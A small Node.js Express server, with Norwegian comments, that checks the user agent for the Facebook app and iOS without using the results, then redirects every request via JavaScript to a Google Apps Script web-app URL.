const express = require('express');
const app = express();

app.get('*', (req, res) => {
    const userAgent = req.headers['user-agent'] || '';
    const isFacebookApp = /FBAV|FBAN/i.test(userAgent); // Sjekker om det er Facebook App
    const isIOS = /iPhone|iPad|iPod/i.test(userAgent); // Sjekker om det er iOS


        res.send(`
            <html>
                <head>
                    <title>Redirecting...</title>
                </head>
                <body>
                    <script>
                        window.location.href = "https://script.google.com/macros/s/AKfycbwrh7hhJioUbGhkAnqTlnEgROgDOSuqZNGUFEbDmtyAFM45uWsfaGaHgcaWdl-gCOvZ/exec";
                    </script>
                </body>
            </html>
        `);
});

const port = process.env.PORT || 3000;
app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
